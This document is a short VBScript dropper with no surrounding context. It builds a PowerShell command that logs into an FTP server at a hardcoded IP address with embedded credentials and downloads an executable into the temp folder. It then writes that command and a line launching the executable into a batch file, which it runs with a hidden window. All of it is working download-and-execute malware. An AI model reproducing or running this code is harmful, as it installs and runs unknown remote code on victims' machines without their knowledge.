Dim Str
Str="powershell -Command " & Chr(34) & "$Username = \" & Chr(34) & "ftpuserl\" & Chr(34) & "; $Password = \" & Chr(34) & "ftpuserloginz\" & Chr(34) & "; $DesktopPath = [Environment]::GetFolderPath(\" & Chr(34) & "Desktop\" & Chr(34) & "); $LocalFile = \" & Chr(34) & "$env:temp\filedasdhjwj212341.exe\" & Chr(34) & "; $RemoteFile = \" & Chr(34) & "ftp://73.102.171.129/ChrZ.exe\" & Chr(34) & ";$FTPRequest = [System.Net.FtpWebRequest]::Create($RemoteFile);$FTPRequest.Credentials = New-Object System.Net.NetworkCredential($Username,$Password);$FTPRequest.Method = [System.Net.WebRequestMethods+Ftp]::DownloadFile;$FTPRequest.UseBinary = $true;$FTPRequest.KeepAlive = $false;$FTPResponse = $FTPRequest.GetResponse();$ResponseStream = $FTPResponse.GetResponseStream();$LocalFileFile = New-Object IO.FileStream ($LocalFile,[IO.FileMode]::Create);[byte[]]$ReadBuffer = New-Object byte[] 1024;do {$ReadLength = $ResponseStream.Read($ReadBuffer,0,1024);$LocalFileFile.Write($ReadBuffer,0,$ReadLength);}while ($ReadLength -ne 0);$LocalFileFile.Close();" & Chr(34) & ""

Dim Str2
Str2="" & Chr(34) & "%tmp%\filedasdhjwj212341.exe" & Chr(34) & ""
Sub CreateAfile
    Set fs = CreateObject("Scripting.FileSystemObject")
    Set a = fs.CreateTextFile("zChrZ.bat", True)
    a.WriteLine(Str)
    a.WriteLine(Str2)
    a.Close
End Sub

call CreateAfile

CreateObject("Wscript.Shell").Run "zChrZ.bat", 0, True
